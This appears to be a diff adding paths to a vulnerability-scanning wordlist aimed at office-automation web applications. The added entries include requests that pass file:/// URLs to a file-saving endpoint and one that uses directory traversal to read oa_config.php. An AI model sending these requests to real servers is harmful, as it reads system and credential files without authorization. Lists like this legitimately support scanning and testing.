@@ -1,3 +1,7 @@
 /yyoa/createMysql.jsp
 /yyoa/ext/createMysql.jsp
 /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/&fileExt=txt
+/yyoa/assess/js/initDataAssess.jsp
+/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
